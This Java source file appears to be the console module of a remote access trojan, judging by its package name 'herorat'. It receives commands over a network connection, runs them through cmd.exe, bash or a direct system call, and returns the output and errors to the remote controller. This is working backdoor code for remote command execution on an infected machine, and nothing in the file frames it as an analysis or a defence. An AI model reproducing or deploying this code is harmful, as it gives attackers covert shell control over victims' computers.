package net.herorat.features.console;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;

import net.herorat.network.Packet;
import net.herorat.network.Packet2Console;


public class Console
{
	public static void handle(String[] args, DataOutputStream outputstream)
	{
		Packet p;
		if (args.length == 2 && args[0].equals("bash"))
		{
			p = new Packet2Console(outputstream, new String[] { execBash(args[1]) });
			p.write();
		}
		else if (args.length == 2 && args[0].equals("sys"))
		{
			p = new Packet2Console(outputstream, new String[] { execSys(args[1]) });
			p.write();
		}
		else
		{
			p = new Packet2Console(outputstream, new String[] { "ERROR" });
			p.write();
		}
	}
	
	public static String execBash(String cmd)
	{
		try
		{
			// Parse the given command
			String[] splitted_cmd = cmd.split("###");
			String[] exec_cmd = new String[splitted_cmd.length + 2];
			
			String os = System.getProperty("os.name", "").toLowerCase();
			if (os.contains("win"))
			{
				exec_cmd[0] = "Cmd.exe";
				exec_cmd[1] = "/C";
			}
			else if (os.contains("nux"))
			{
				exec_cmd[0] = "/bin/bash";
				exec_cmd[1] = "-c";
			}
			else if (os.contains("mac"))
			{
				exec_cmd[0] = "/usr/bin/open";
				exec_cmd[1] = "-a";
			}
			else
			{
				return "";
			}
			
			for (int i=0; i<splitted_cmd.length; i++)
			{
				exec_cmd[2 + i] = splitted_cmd[i];
			}
			
			// Execute the command in the shell
			Process process = Runtime.getRuntime().exec(exec_cmd);
			
			StringBuffer response = new StringBuffer();
			
			String line;
			BufferedReader buffer_response = new BufferedReader(new InputStreamReader(process.getInputStream()));
			BufferedReader buffer_error = new BufferedReader(new InputStreamReader(process.getErrorStream()));
			while ((line = buffer_response.readLine()) != null)
			{
				response.append(line + "\n");
			}
			buffer_response.close();
			while ((line = buffer_error.readLine()) != null)
			{
				response.append(line + "\n");
			}
			buffer_error.close();
			process.waitFor();
			
			return response.toString();
		}
		catch (Exception e) {}
		
		return "";
	}
	
	public static String execSys(String cmd)
	{
		try
		{
			String[] splitted_cmd = cmd.split("###");
		
			// Execute the system command
			Process process = Runtime.getRuntime().exec(splitted_cmd);
			
			StringBuffer response = new StringBuffer();
			
			String line;
			BufferedReader buffer_response = new BufferedReader(new InputStreamReader(process.getInputStream()));
			BufferedReader buffer_error = new BufferedReader(new InputStreamReader(process.getErrorStream()));
			while ((line = buffer_response.readLine()) != null)
			{
				response.append(line + "\n");
			}
			buffer_response.close();
			while ((line = buffer_error.readLine()) != null)
			{
				response.append(line + "\n");
			}
			buffer_error.close();
			process.waitFor();
			
			return response.toString();
		}
		catch (Exception e) {}
		
		return "";
	}
}